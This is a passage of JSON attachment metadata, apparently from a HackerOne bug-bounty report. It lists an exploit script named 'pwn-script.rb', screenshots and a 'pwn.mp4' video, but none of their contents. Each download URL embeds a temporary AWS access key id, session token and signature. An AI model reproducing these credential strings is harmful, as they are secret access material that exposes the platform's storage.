          "url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/RAdK9JgLxkJPETmEn129s2g4?response-content-disposition=attachment%3B%20filename%3D%22pwn-script.rb%22%3B%20filename%2A%3DUTF-8%27%27pwn-script.rb&response-content-type=text%2Fx-ruby-script&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQX3NXO7QZ%2F20230923%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230923T072803Z&X-Amz-Expires=2675&X-Amz-Security-Token=IQoJb3JpZ2luX2VjECoaCXVzLXdlc3QtMiJIMEYCIQCbnlzM5i9WfTN9kNxGF%2BjO0%2FfzKIA0Hp70NjlTDwNasQIhAJyYEwtXT0%2BRZZxjv1NrFggoNOCoT3mU%2F7cjdG7P8rDbKrIFCCMQAxoMMDEzNjE5Mjc0ODQ5IgwINFq%2BLpY0xrM%2FogAqjwUr4hE%2FkGSCvZilvvzrBYsaW3zlott55AeXoNO%2Bj2HYvHW%2BaezLi6ZkzkofawG98TuqywgTo7pw1vT4K6IwMSLMTshH9WVsgHZCGplgQndh%2Byc9RHbjS5Vd8xr5Fz7oZobSe67MtQjAZRksk3xOS%2BnG%2BZdi591LH9JYcScpJi0a%2BayucR6SqtCTx3Ftfh0nKTYnFl4CvyKfDu3DIWu3N160aQ5ZH1xNmIB9u47MR7Y%2FPbUZ5zdMdhuN%2BDnB6z0vnZh9O8IR0bH5KF%2ByhW0ZDS5R8jyaDV%2F0lRV0O2taMMTbpJ%2F4EytVsnWR8sWfSzo6bVTiN%2B6mY%2BNLQChX0a8SL8ihPkK%2FueXSSAY9I4jT7HudO2YQwibAD%2Bdw9LKl35cfz7DRajTkq040qmhm91Yh3sPZpP1fuPVTsbSN7HfsvQGrZtNjEnMLOtMu61iHPDuEaC758m54aA56cSVZV6XrnGQQALFIgk7YTJ7APtpigQswVRHwyJyM2TOrarCDkx9FDWB3LkhBMfQjPTJwND4p0zsU2Td9KXP6Bl1O2xgmciDdmUWMsx45ZfUjMNiZ3PGvFGBzFZPsNJYuApSxy4oSGjI5o9WW0zLSETGgoUS4NFp1Kcv9YofmvzBSA08hDc2URAMdhmLCBhvZYKMA5IxeYX71XFIXJGVv9PamSlGZYUe5KPaagnP1MwmX3L227L9ytSPgmQEbhiZbUHzZrvRSB%2B5MnRZL225Rk0T7bKyORaST7iwdfCIhKdgDfuIPjykoBeXqMp8oE8hzVcNSrDaMqfYp%2FiMD99n6D4Q3kET9pMITkEi88Jw%2F5KSj9g77aiqCOhq8wf6%2FN7cEzwE1hPG9khV7asG7w7q5Ap09NS%2FoP0vPMJmGuagGOrAB55LPfipuctKTaGiNyV3c0qioH29nw%2FCxvbTC1WGAXoLJb3L25AlAYuDH8k1piCJEu5XYB84c%2B4aAb7sJGB2l8gv8cgewyAB1JuKmSpWOJ0dkGfMtQr627YQZFkefX%2B%2FekQoLWMLa6BWMaFqWi58mr23nneygiJiXGTTBD39ixLpEJxvuWk4%2F2pMnbJuQOLi8wolfYl8yYnBKLBKFqMTRVnYPYBE%2BTjE6e5FUUt0vkA4%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=dfb18601b8642a61b0344f449390e304910d0397fb8b588495ca08987ff93c51"
        },
        {
          "id": 857595,
          "filename": "Screen_Shot_2020-06-01_at_3.02.29_PM.png",
          "type": "image/png",
          "url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/pZRLWtqTYpYt4ra94Jh2NPi8?response-content-disposition=attachment%3B%20filename%3D%22Screen_Shot_2020-06-01_at_3.02.29_PM.png%22%3B%20filename%2A%3DUTF-8%27%27Screen_Shot_2020-06-01_at_3.02.29_PM.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQX3NXO7QZ%2F20230923%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230923T072803Z&X-Amz-Expires=2675&X-Amz-Security-Token=IQoJb3JpZ2luX2VjECoaCXVzLXdlc3QtMiJIMEYCIQCbnlzM5i9WfTN9kNxGF%2BjO0%2FfzKIA0Hp70NjlTDwNasQIhAJyYEwtXT0%2BRZZxjv1NrFggoNOCoT3mU%2F7cjdG7P8rDbKrIFCCMQAxoMMDEzNjE5Mjc0ODQ5IgwINFq%2BLpY0xrM%2FogAqjwUr4hE%2FkGSCvZilvvzrBYsaW3zlott55AeXoNO%2Bj2HYvHW%2BaezLi6ZkzkofawG98TuqywgTo7pw1vT4K6IwMSLMTshH9WVsgHZCGplgQndh%2Byc9RHbjS5Vd8xr5Fz7oZobSe67MtQjAZRksk3xOS%2BnG%2BZdi591LH9JYcScpJi0a%2BayucR6SqtCTx3Ftfh0nKTYnFl4CvyKfDu3DIWu3N160aQ5ZH1xNmIB9u47MR7Y%2FPbUZ5zdMdhuN%2BDnB6z0vnZh9O8IR0bH5KF%2ByhW0ZDS5R8jyaDV%2F0lRV0O2taMMTbpJ%2F4EytVsnWR8sWfSzo6bVTiN%2B6mY%2BNLQChX0a8SL8ihPkK%2FueXSSAY9I4jT7HudO2YQwibAD%2Bdw9LKl35cfz7DRajTkq040qmhm91Yh3sPZpP1fuPVTsbSN7HfsvQGrZtNjEnMLOtMu61iHPDuEaC758m54aA56cSVZV6XrnGQQALFIgk7YTJ7APtpigQswVRHwyJyM2TOrarCDkx9FDWB3LkhBMfQjPTJwND4p0zsU2Td9KXP6Bl1O2xgmciDdmUWMsx45ZfUjMNiZ3PGvFGBzFZPsNJYuApSxy4oSGjI5o9WW0zLSETGgoUS4NFp1Kcv9YofmvzBSA08hDc2URAMdhmLCBhvZYKMA5IxeYX71XFIXJGVv9PamSlGZYUe5KPaagnP1MwmX3L227L9ytSPgmQEbhiZbUHzZrvRSB%2B5MnRZL225Rk0T7bKyORaST7iwdfCIhKdgDfuIPjykoBeXqMp8oE8hzVcNSrDaMqfYp%2FiMD99n6D4Q3kET9pMITkEi88Jw%2F5KSj9g77aiqCOhq8wf6%2FN7cEzwE1hPG9khV7asG7w7q5Ap09NS%2FoP0vPMJmGuagGOrAB55LPfipuctKTaGiNyV3c0qioH29nw%2FCxvbTC1WGAXoLJb3L25AlAYuDH8k1piCJEu5XYB84c%2B4aAb7sJGB2l8gv8cgewyAB1JuKmSpWOJ0dkGfMtQr627YQZFkefX%2B%2FekQoLWMLa6BWMaFqWi58mr23nneygiJiXGTTBD39ixLpEJxvuWk4%2F2pMnbJuQOLi8wolfYl8yYnBKLBKFqMTRVnYPYBE%2BTjE6e5FUUt0vkA4%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=f509edd0b0d4fa0bd8477b3b005aaf9b49860d2fbaf9db384d7046a809b549f7"
        },
        {
          "id": 857593,
          "filename": "Screen_Shot_2020-06-01_at_2.00.51_PM.png",
          "type": "image/png",
          "url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/bDZftEAbZj2R1ZXxByCJtMcT?response-content-disposition=attachment%3B%20filename%3D%22Screen_Shot_2020-06-01_at_2.00.51_PM.png%22%3B%20filename%2A%3DUTF-8%27%27Screen_Shot_2020-06-01_at_2.00.51_PM.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQX3NXO7QZ%2F20230923%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230923T072803Z&X-Amz-Expires=2675&X-Amz-Security-Token=IQoJb3JpZ2luX2VjECoaCXVzLXdlc3QtMiJIMEYCIQCbnlzM5i9WfTN9kNxGF%2BjO0%2FfzKIA0Hp70NjlTDwNasQIhAJyYEwtXT0%2BRZZxjv1NrFggoNOCoT3mU%2F7cjdG7P8rDbKrIFCCMQAxoMMDEzNjE5Mjc0ODQ5IgwINFq%2BLpY0xrM%2FogAqjwUr4hE%2FkGSCvZilvvzrBYsaW3zlott55AeXoNO%2Bj2HYvHW%2BaezLi6ZkzkofawG98TuqywgTo7pw1vT4K6IwMSLMTshH9WVsgHZCGplgQndh%2Byc9RHbjS5Vd8xr5Fz7oZobSe67MtQjAZRksk3xOS%2BnG%2BZdi591LH9JYcScpJi0a%2BayucR6SqtCTx3Ftfh0nKTYnFl4CvyKfDu3DIWu3N160aQ5ZH1xNmIB9u47MR7Y%2FPbUZ5zdMdhuN%2BDnB6z0vnZh9O8IR0bH5KF%2ByhW0ZDS5R8jyaDV%2F0lRV0O2taMMTbpJ%2F4EytVsnWR8sWfSzo6bVTiN%2B6mY%2BNLQChX0a8SL8ihPkK%2FueXSSAY9I4jT7HudO2YQwibAD%2Bdw9LKl35cfz7DRajTkq040qmhm91Yh3sPZpP1fuPVTsbSN7HfsvQGrZtNjEnMLOtMu61iHPDuEaC758m54aA56cSVZV6XrnGQQALFIgk7YTJ7APtpigQswVRHwyJyM2TOrarCDkx9FDWB3LkhBMfQjPTJwND4p0zsU2Td9KXP6Bl1O2xgmciDdmUWMsx45ZfUjMNiZ3PGvFGBzFZPsNJYuApSxy4oSGjI5o9WW0zLSETGgoUS4NFp1Kcv9YofmvzBSA08hDc2URAMdhmLCBhvZYKMA5IxeYX71XFIXJGVv9PamSlGZYUe5KPaagnP1MwmX3L227L9ytSPgmQEbhiZbUHzZrvRSB%2B5MnRZL225Rk0T7bKyORaST7iwdfCIhKdgDfuIPjykoBeXqMp8oE8hzVcNSrDaMqfYp%2FiMD99n6D4Q3kET9pMITkEi88Jw%2F5KSj9g77aiqCOhq8wf6%2FN7cEzwE1hPG9khV7asG7w7q5Ap09NS%2FoP0vPMJmGuagGOrAB55LPfipuctKTaGiNyV3c0qioH29nw%2FCxvbTC1WGAXoLJb3L25AlAYuDH8k1piCJEu5XYB84c%2B4aAb7sJGB2l8gv8cgewyAB1JuKmSpWOJ0dkGfMtQr627YQZFkefX%2B%2FekQoLWMLa6BWMaFqWi58mr23nneygiJiXGTTBD39ixLpEJxvuWk4%2F2pMnbJuQOLi8wolfYl8yYnBKLBKFqMTRVnYPYBE%2BTjE6e5FUUt0vkA4%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=0395661f3793777c57dbf034e22bf4d8b5888402d5bef7c98fa1c3447a102975"
        },
        {
          "id": 857592,
          "filename": "Screen_Shot_2020-06-01_at_1.44.46_PM.png",
          "type": "image/png",
          "url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/RLjjuE1RCvaNtAC7r8c48UZk?response-content-disposition=attachment%3B%20filename%3D%22Screen_Shot_2020-06-01_at_1.44.46_PM.png%22%3B%20filename%2A%3DUTF-8%27%27Screen_Shot_2020-06-01_at_1.44.46_PM.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQX3NXO7QZ%2F20230923%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230923T072803Z&X-Amz-Expires=2675&X-Amz-Security-Token=IQoJb3JpZ2luX2VjECoaCXVzLXdlc3QtMiJIMEYCIQCbnlzM5i9WfTN9kNxGF%2BjO0%2FfzKIA0Hp70NjlTDwNasQIhAJyYEwtXT0%2BRZZxjv1NrFggoNOCoT3mU%2F7cjdG7P8rDbKrIFCCMQAxoMMDEzNjE5Mjc0ODQ5IgwINFq%2BLpY0xrM%2FogAqjwUr4hE%2FkGSCvZilvvzrBYsaW3zlott55AeXoNO%2Bj2HYvHW%2BaezLi6ZkzkofawG98TuqywgTo7pw1vT4K6IwMSLMTshH9WVsgHZCGplgQndh%2Byc9RHbjS5Vd8xr5Fz7oZobSe67MtQjAZRksk3xOS%2BnG%2BZdi591LH9JYcScpJi0a%2BayucR6SqtCTx3Ftfh0nKTYnFl4CvyKfDu3DIWu3N160aQ5ZH1xNmIB9u47MR7Y%2FPbUZ5zdMdhuN%2BDnB6z0vnZh9O8IR0bH5KF%2ByhW0ZDS5R8jyaDV%2F0lRV0O2taMMTbpJ%2F4EytVsnWR8sWfSzo6bVTiN%2B6mY%2BNLQChX0a8SL8ihPkK%2FueXSSAY9I4jT7HudO2YQwibAD%2Bdw9LKl35cfz7DRajTkq040qmhm91Yh3sPZpP1fuPVTsbSN7HfsvQGrZtNjEnMLOtMu61iHPDuEaC758m54aA56cSVZV6XrnGQQALFIgk7YTJ7APtpigQswVRHwyJyM2TOrarCDkx9FDWB3LkhBMfQjPTJwND4p0zsU2Td9KXP6Bl1O2xgmciDdmUWMsx45ZfUjMNiZ3PGvFGBzFZPsNJYuApSxy4oSGjI5o9WW0zLSETGgoUS4NFp1Kcv9YofmvzBSA08hDc2URAMdhmLCBhvZYKMA5IxeYX71XFIXJGVv9PamSlGZYUe5KPaagnP1MwmX3L227L9ytSPgmQEbhiZbUHzZrvRSB%2B5MnRZL225Rk0T7bKyORaST7iwdfCIhKdgDfuIPjykoBeXqMp8oE8hzVcNSrDaMqfYp%2FiMD99n6D4Q3kET9pMITkEi88Jw%2F5KSj9g77aiqCOhq8wf6%2FN7cEzwE1hPG9khV7asG7w7q5Ap09NS%2FoP0vPMJmGuagGOrAB55LPfipuctKTaGiNyV3c0qioH29nw%2FCxvbTC1WGAXoLJb3L25AlAYuDH8k1piCJEu5XYB84c%2B4aAb7sJGB2l8gv8cgewyAB1JuKmSpWOJ0dkGfMtQr627YQZFkefX%2B%2FekQoLWMLa6BWMaFqWi58mr23nneygiJiXGTTBD39ixLpEJxvuWk4%2F2pMnbJuQOLi8wolfYl8yYnBKLBKFqMTRVnYPYBE%2BTjE6e5FUUt0vkA4%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=23f5ba04cc45ab16d0dc71544218ab362c56febbd5ad204842046b75747b8453"
        },
        {
          "id": 857591,
          "filename": "Screen_Shot_2020-06-01_at_11.31.24_AM.png",
          "type": "image/png",
          "url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/tFwXeWDijqRAbC6nFdFunTyB?response-content-disposition=attachment%3B%20filename%3D%22Screen_Shot_2020-06-01_at_11.31.24_AM.png%22%3B%20filename%2A%3DUTF-8%27%27Screen_Shot_2020-06-01_at_11.31.24_AM.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQX3NXO7QZ%2F20230923%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230923T072803Z&X-Amz-Expires=2675&X-Amz-Security-Token=IQoJb3JpZ2luX2VjECoaCXVzLXdlc3QtMiJIMEYCIQCbnlzM5i9WfTN9kNxGF%2BjO0%2FfzKIA0Hp70NjlTDwNasQIhAJyYEwtXT0%2BRZZxjv1NrFggoNOCoT3mU%2F7cjdG7P8rDbKrIFCCMQAxoMMDEzNjE5Mjc0ODQ5IgwINFq%2BLpY0xrM%2FogAqjwUr4hE%2FkGSCvZilvvzrBYsaW3zlott55AeXoNO%2Bj2HYvHW%2BaezLi6ZkzkofawG98TuqywgTo7pw1vT4K6IwMSLMTshH9WVsgHZCGplgQndh%2Byc9RHbjS5Vd8xr5Fz7oZobSe67MtQjAZRksk3xOS%2BnG%2BZdi591LH9JYcScpJi0a%2BayucR6SqtCTx3Ftfh0nKTYnFl4CvyKfDu3DIWu3N160aQ5ZH1xNmIB9u47MR7Y%2FPbUZ5zdMdhuN%2BDnB6z0vnZh9O8IR0bH5KF%2ByhW0ZDS5R8jyaDV%2F0lRV0O2taMMTbpJ%2F4EytVsnWR8sWfSzo6bVTiN%2B6mY%2BNLQChX0a8SL8ihPkK%2FueXSSAY9I4jT7HudO2YQwibAD%2Bdw9LKl35cfz7DRajTkq040qmhm91Yh3sPZpP1fuPVTsbSN7HfsvQGrZtNjEnMLOtMu61iHPDuEaC758m54aA56cSVZV6XrnGQQALFIgk7YTJ7APtpigQswVRHwyJyM2TOrarCDkx9FDWB3LkhBMfQjPTJwND4p0zsU2Td9KXP6Bl1O2xgmciDdmUWMsx45ZfUjMNiZ3PGvFGBzFZPsNJYuApSxy4oSGjI5o9WW0zLSETGgoUS4NFp1Kcv9YofmvzBSA08hDc2URAMdhmLCBhvZYKMA5IxeYX71XFIXJGVv9PamSlGZYUe5KPaagnP1MwmX3L227L9ytSPgmQEbhiZbUHzZrvRSB%2B5MnRZL225Rk0T7bKyORaST7iwdfCIhKdgDfuIPjykoBeXqMp8oE8hzVcNSrDaMqfYp%2FiMD99n6D4Q3kET9pMITkEi88Jw%2F5KSj9g77aiqCOhq8wf6%2FN7cEzwE1hPG9khV7asG7w7q5Ap09NS%2FoP0vPMJmGuagGOrAB55LPfipuctKTaGiNyV3c0qioH29nw%2FCxvbTC1WGAXoLJb3L25AlAYuDH8k1piCJEu5XYB84c%2B4aAb7sJGB2l8gv8cgewyAB1JuKmSpWOJ0dkGfMtQr627YQZFkefX%2B%2FekQoLWMLa6BWMaFqWi58mr23nneygiJiXGTTBD39ixLpEJxvuWk4%2F2pMnbJuQOLi8wolfYl8yYnBKLBKFqMTRVnYPYBE%2BTjE6e5FUUt0vkA4%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=43b53b68cd4b5cfd1b1a49cd0cdfa09e2ddc436a566d6ab19faab07d31396da5"
        },
        {
          "id": 857590,
          "filename": "Screen_Shot_2020-06-01_at_11.18.46_AM.png",
          "type": "image/png",
          "url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/G3eYoRYmN25hEwK6wkBgphoW?response-content-disposition=attachment%3B%20filename%3D%22Screen_Shot_2020-06-01_at_11.18.46_AM.png%22%3B%20filename%2A%3DUTF-8%27%27Screen_Shot_2020-06-01_at_11.18.46_AM.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQX3NXO7QZ%2F20230923%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230923T072803Z&X-Amz-Expires=2675&X-Amz-Security-Token=IQoJb3JpZ2luX2VjECoaCXVzLXdlc3QtMiJIMEYCIQCbnlzM5i9WfTN9kNxGF%2BjO0%2FfzKIA0Hp70NjlTDwNasQIhAJyYEwtXT0%2BRZZxjv1NrFggoNOCoT3mU%2F7cjdG7P8rDbKrIFCCMQAxoMMDEzNjE5Mjc0ODQ5IgwINFq%2BLpY0xrM%2FogAqjwUr4hE%2FkGSCvZilvvzrBYsaW3zlott55AeXoNO%2Bj2HYvHW%2BaezLi6ZkzkofawG98TuqywgTo7pw1vT4K6IwMSLMTshH9WVsgHZCGplgQndh%2Byc9RHbjS5Vd8xr5Fz7oZobSe67MtQjAZRksk3xOS%2BnG%2BZdi591LH9JYcScpJi0a%2BayucR6SqtCTx3Ftfh0nKTYnFl4CvyKfDu3DIWu3N160aQ5ZH1xNmIB9u47MR7Y%2FPbUZ5zdMdhuN%2BDnB6z0vnZh9O8IR0bH5KF%2ByhW0ZDS5R8jyaDV%2F0lRV0O2taMMTbpJ%2F4EytVsnWR8sWfSzo6bVTiN%2B6mY%2BNLQChX0a8SL8ihPkK%2FueXSSAY9I4jT7HudO2YQwibAD%2Bdw9LKl35cfz7DRajTkq040qmhm91Yh3sPZpP1fuPVTsbSN7HfsvQGrZtNjEnMLOtMu61iHPDuEaC758m54aA56cSVZV6XrnGQQALFIgk7YTJ7APtpigQswVRHwyJyM2TOrarCDkx9FDWB3LkhBMfQjPTJwND4p0zsU2Td9KXP6Bl1O2xgmciDdmUWMsx45ZfUjMNiZ3PGvFGBzFZPsNJYuApSxy4oSGjI5o9WW0zLSETGgoUS4NFp1Kcv9YofmvzBSA08hDc2URAMdhmLCBhvZYKMA5IxeYX71XFIXJGVv9PamSlGZYUe5KPaagnP1MwmX3L227L9ytSPgmQEbhiZbUHzZrvRSB%2B5MnRZL225Rk0T7bKyORaST7iwdfCIhKdgDfuIPjykoBeXqMp8oE8hzVcNSrDaMqfYp%2FiMD99n6D4Q3kET9pMITkEi88Jw%2F5KSj9g77aiqCOhq8wf6%2FN7cEzwE1hPG9khV7asG7w7q5Ap09NS%2FoP0vPMJmGuagGOrAB55LPfipuctKTaGiNyV3c0qioH29nw%2FCxvbTC1WGAXoLJb3L25AlAYuDH8k1piCJEu5XYB84c%2B4aAb7sJGB2l8gv8cgewyAB1JuKmSpWOJ0dkGfMtQr627YQZFkefX%2B%2FekQoLWMLa6BWMaFqWi58mr23nneygiJiXGTTBD39ixLpEJxvuWk4%2F2pMnbJuQOLi8wolfYl8yYnBKLBKFqMTRVnYPYBE%2BTjE6e5FUUt0vkA4%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=807d9d7aadb577744b0e891f53cac1a40fc093fc9ea8d222430f05b62d6024d8"
        },
        {
          "id": 857589,
          "filename": "Screen_Shot_2020-06-01_at_5.29.03_PM.png",
          "type": "image/png",
          "url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/YjDL6Ug1BbMLoYzo28yEcHkg?response-content-disposition=attachment%3B%20filename%3D%22Screen_Shot_2020-06-01_at_5.29.03_PM.png%22%3B%20filename%2A%3DUTF-8%27%27Screen_Shot_2020-06-01_at_5.29.03_PM.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQX3NXO7QZ%2F20230923%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230923T072803Z&X-Amz-Expires=2675&X-Amz-Security-Token=IQoJb3JpZ2luX2VjECoaCXVzLXdlc3QtMiJIMEYCIQCbnlzM5i9WfTN9kNxGF%2BjO0%2FfzKIA0Hp70NjlTDwNasQIhAJyYEwtXT0%2BRZZxjv1NrFggoNOCoT3mU%2F7cjdG7P8rDbKrIFCCMQAxoMMDEzNjE5Mjc0ODQ5IgwINFq%2BLpY0xrM%2FogAqjwUr4hE%2FkGSCvZilvvzrBYsaW3zlott55AeXoNO%2Bj2HYvHW%2BaezLi6ZkzkofawG98TuqywgTo7pw1vT4K6IwMSLMTshH9WVsgHZCGplgQndh%2Byc9RHbjS5Vd8xr5Fz7oZobSe67MtQjAZRksk3xOS%2BnG%2BZdi591LH9JYcScpJi0a%2BayucR6SqtCTx3Ftfh0nKTYnFl4CvyKfDu3DIWu3N160aQ5ZH1xNmIB9u47MR7Y%2FPbUZ5zdMdhuN%2BDnB6z0vnZh9O8IR0bH5KF%2ByhW0ZDS5R8jyaDV%2F0lRV0O2taMMTbpJ%2F4EytVsnWR8sWfSzo6bVTiN%2B6mY%2BNLQChX0a8SL8ihPkK%2FueXSSAY9I4jT7HudO2YQwibAD%2Bdw9LKl35cfz7DRajTkq040qmhm91Yh3sPZpP1fuPVTsbSN7HfsvQGrZtNjEnMLOtMu61iHPDuEaC758m54aA56cSVZV6XrnGQQALFIgk7YTJ7APtpigQswVRHwyJyM2TOrarCDkx9FDWB3LkhBMfQjPTJwND4p0zsU2Td9KXP6Bl1O2xgmciDdmUWMsx45ZfUjMNiZ3PGvFGBzFZPsNJYuApSxy4oSGjI5o9WW0zLSETGgoUS4NFp1Kcv9YofmvzBSA08hDc2URAMdhmLCBhvZYKMA5IxeYX71XFIXJGVv9PamSlGZYUe5KPaagnP1MwmX3L227L9ytSPgmQEbhiZbUHzZrvRSB%2B5MnRZL225Rk0T7bKyORaST7iwdfCIhKdgDfuIPjykoBeXqMp8oE8hzVcNSrDaMqfYp%2FiMD99n6D4Q3kET9pMITkEi88Jw%2F5KSj9g77aiqCOhq8wf6%2FN7cEzwE1hPG9khV7asG7w7q5Ap09NS%2FoP0vPMJmGuagGOrAB55LPfipuctKTaGiNyV3c0qioH29nw%2FCxvbTC1WGAXoLJb3L25AlAYuDH8k1piCJEu5XYB84c%2B4aAb7sJGB2l8gv8cgewyAB1JuKmSpWOJ0dkGfMtQr627YQZFkefX%2B%2FekQoLWMLa6BWMaFqWi58mr23nneygiJiXGTTBD39ixLpEJxvuWk4%2F2pMnbJuQOLi8wolfYl8yYnBKLBKFqMTRVnYPYBE%2BTjE6e5FUUt0vkA4%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=4c108a1553161900998dd8665fee98b6a6643fe977e2274d2c33345a3dbdf0da"
        },
        {
          "id": 857588,
          "filename": "classic-1-black_1024x768.jpg",
          "type": "image/jpeg",
          "url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/NjkajZ78MPTkv6QWP7zii36A?response-content-disposition=attachment%3B%20filename%3D%22classic-1-black_1024x768.jpg%22%3B%20filename%2A%3DUTF-8%27%27classic-1-black_1024x768.jpg&response-content-type=image%2Fjpeg&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQX3NXO7QZ%2F20230923%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230923T072803Z&X-Amz-Expires=2675&X-Amz-Security-Token=IQoJb3JpZ2luX2VjECoaCXVzLXdlc3QtMiJIMEYCIQCbnlzM5i9WfTN9kNxGF%2BjO0%2FfzKIA0Hp70NjlTDwNasQIhAJyYEwtXT0%2BRZZxjv1NrFggoNOCoT3mU%2F7cjdG7P8rDbKrIFCCMQAxoMMDEzNjE5Mjc0ODQ5IgwINFq%2BLpY0xrM%2FogAqjwUr4hE%2FkGSCvZilvvzrBYsaW3zlott55AeXoNO%2Bj2HYvHW%2BaezLi6ZkzkofawG98TuqywgTo7pw1vT4K6IwMSLMTshH9WVsgHZCGplgQndh%2Byc9RHbjS5Vd8xr5Fz7oZobSe67MtQjAZRksk3xOS%2BnG%2BZdi591LH9JYcScpJi0a%2BayucR6SqtCTx3Ftfh0nKTYnFl4CvyKfDu3DIWu3N160aQ5ZH1xNmIB9u47MR7Y%2FPbUZ5zdMdhuN%2BDnB6z0vnZh9O8IR0bH5KF%2ByhW0ZDS5R8jyaDV%2F0lRV0O2taMMTbpJ%2F4EytVsnWR8sWfSzo6bVTiN%2B6mY%2BNLQChX0a8SL8ihPkK%2FueXSSAY9I4jT7HudO2YQwibAD%2Bdw9LKl35cfz7DRajTkq040qmhm91Yh3sPZpP1fuPVTsbSN7HfsvQGrZtNjEnMLOtMu61iHPDuEaC758m54aA56cSVZV6XrnGQQALFIgk7YTJ7APtpigQswVRHwyJyM2TOrarCDkx9FDWB3LkhBMfQjPTJwND4p0zsU2Td9KXP6Bl1O2xgmciDdmUWMsx45ZfUjMNiZ3PGvFGBzFZPsNJYuApSxy4oSGjI5o9WW0zLSETGgoUS4NFp1Kcv9YofmvzBSA08hDc2URAMdhmLCBhvZYKMA5IxeYX71XFIXJGVv9PamSlGZYUe5KPaagnP1MwmX3L227L9ytSPgmQEbhiZbUHzZrvRSB%2B5MnRZL225Rk0T7bKyORaST7iwdfCIhKdgDfuIPjykoBeXqMp8oE8hzVcNSrDaMqfYp%2FiMD99n6D4Q3kET9pMITkEi88Jw%2F5KSj9g77aiqCOhq8wf6%2FN7cEzwE1hPG9khV7asG7w7q5Ap09NS%2FoP0vPMJmGuagGOrAB55LPfipuctKTaGiNyV3c0qioH29nw%2FCxvbTC1WGAXoLJb3L25AlAYuDH8k1piCJEu5XYB84c%2B4aAb7sJGB2l8gv8cgewyAB1JuKmSpWOJ0dkGfMtQr627YQZFkefX%2B%2FekQoLWMLa6BWMaFqWi58mr23nneygiJiXGTTBD39ixLpEJxvuWk4%2F2pMnbJuQOLi8wolfYl8yYnBKLBKFqMTRVnYPYBE%2BTjE6e5FUUt0vkA4%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=5e3c9b88c7f5b3860046ccffda654c84b41d1cf600f3e3f075c44ddedbbac41e"
        },
        {
          "id": 857587,
          "filename": "pwn.mp4",
          "type": "video/mp4",
          "url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/vMYN5m529gvq27oVHfq2E9AG?response-content-disposition=attachment%3B%20filename%3D%22pwn.mp4%22%3B%20filename%2A%3DUTF-8%27%27pwn.mp4&response-content-type=video%2Fmp4&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQX3NXO7QZ%2F20230923%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230923T072803Z&X-Amz-Expires=2675&X-Amz-Security-Token=IQoJb3JpZ2luX2VjECoaCXVzLXdlc3QtMiJIMEYCIQCbnlzM5i9WfTN9kNxGF%2BjO0%2FfzKIA0Hp70NjlTDwNasQIhAJyYEwtXT0%2BRZZxjv1NrFggoNOCoT3mU%2F7cjdG7P8rDbKrIFCCMQAxoMMDEzNjE5Mjc0ODQ5IgwINFq%2BLpY0xrM%2FogAqjwUr4hE%2FkGSCvZilvvzrBYsaW3zlott55AeXoNO%2Bj2HYvHW%2BaezLi6ZkzkofawG98TuqywgTo7pw1vT4K6IwMSLMTshH9WVsgHZCGplgQndh%2Byc9RHbjS5Vd8xr5Fz7oZobSe67MtQjAZRksk3xOS%2BnG%2BZdi591LH9JYcScpJi0a%2BayucR6SqtCTx3Ftfh0nKTYnFl4CvyKfDu3DIWu3N160aQ5ZH1xNmIB9u47MR7Y%2FPbUZ5zdMdhuN%2BDnB6z0vnZh9O8IR0bH5KF%2ByhW0ZDS5R8jyaDV%2F0lRV0O2taMMTbpJ%2F4EytVsnWR8sWfSzo6bVTiN%2B6mY%2BNLQChX0a8SL8ihPkK%2FueXSSAY9I4jT7HudO2YQwibAD%2Bdw9LKl35cfz7DRajTkq040qmhm91Yh3sPZpP1fuPVTsbSN7HfsvQGrZtNjEnMLOtMu61iHPDuEaC758m54aA56cSVZV6XrnGQQALFIgk7YTJ7APtpigQswVRHwyJyM2TOrarCDkx9FDWB3LkhBMfQjPTJwND4p0zsU2Td9KXP6Bl1O2xgmciDdmUWMsx45ZfUjMNiZ3PGvFGBzFZPsNJYuApSxy4oSGjI5o9WW0zLSETGgoUS4NFp1Kcv9YofmvzBSA08hDc2URAMdhmLCBhvZYKMA5IxeYX71XFIXJGVv9PamSlG